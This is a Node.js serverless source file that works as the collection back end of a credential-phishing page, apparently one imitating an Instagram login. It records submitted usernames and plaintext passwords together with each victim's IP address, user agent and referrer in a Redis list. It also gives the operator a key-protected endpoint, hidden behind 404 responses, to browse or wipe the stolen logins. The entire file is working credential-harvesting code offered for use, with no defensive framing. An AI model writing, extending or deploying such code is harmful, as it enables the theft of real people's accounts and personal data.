// lang: Node, file: api/logs.js, target: Vercel serverless (Node 26, ESM)
// POST   /api/logs                    -> capture (JSON body from login page)
// GET    /api/logs?k=…&page=&limit=    -> JSON { entries, total, page, limit }
// DELETE /api/logs?k=…                 -> wipes the Redis list

import { Redis } from '@upstash/redis';

export const config = { runtime: 'nodejs' };

const LOG_KEY = 'ig:logs';
const MAX_KEEP = 500;
const DEFAULT_LIMIT = 25;
const MAX_LIMIT = 100;

function redis() {
  // Check UPSTASH_ first, fallback to KV_ (Vercel integration names)
  const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
  
  if (!url || !token) return null;
  return new Redis({ url, token });
}

function fmtEntry(d, ip) {
  return JSON.stringify({
    ts: d.ts || new Date().toISOString(),
    ip,
    ua: d.ua || '',
    lang: d.lang || '',
    ref: d.ref || '',
    user: d.username || '',
    pass: d.password || '',
  });
}

function checkKey(req) {
  const want = process.env.VIEW_KEY || '';
  const got = (req.query && req.query.k) || '';
  return want && got === want;
}

export default async function handler(req, res) {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
           || req.socket?.remoteAddress || 'unknown';

  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    body = body || {};
    if (!body.username && !body.password) { res.status(204).end(); return; }

    const r = redis();
    if (!r) { res.status(500).json({ error: 'redis not configured' }); return; }

    try {
      await r.lpush(LOG_KEY, fmtEntry(body, ip));
      await r.ltrim(LOG_KEY, 0, MAX_KEEP - 1);
    } catch (e) {
      res.status(500).json({ error: 'redis write failed', detail: String(e) });
      return;
    }

    res.status(204).end();
    return;
  }

  if (!checkKey(req)) { res.status(404).end(); return; }

  const r = redis();
  if (!r) { res.status(500).json({ error: 'redis not configured' }); return; }

  if (req.method === 'GET') {
    const q = req.query || {};
    const page  = Math.max(0, parseInt(q.page, 10) || 0);
    const limit = Math.min(MAX_LIMIT, Math.max(1, parseInt(q.limit, 10) || DEFAULT_LIMIT));
    const start = page * limit;
    const stop  = start + limit - 1;

    let total = 0, rows = [];
    try {
      total = await r.llen(LOG_KEY);
      rows  = await r.lrange(LOG_KEY, start, stop);
    } catch (e) {
      res.status(500).json({ error: 'redis read failed', detail: String(e) });
      return;
    }

    const entries = rows.map(line => {
      try { return JSON.parse(line); }
      catch { return { ts: '', ip: '', ua: '', user: '', pass: '', raw: String(line) }; }
    });

    res.setHeader('Cache-Control', 'no-store');
    res.status(200).json({ entries, total, page, limit });
    return;
  }

  if (req.method === 'DELETE') {
    try { await r.del(LOG_KEY); } catch (_) {}
    res.status(204).end();
    return;
  }

  res.status(405).end();
}
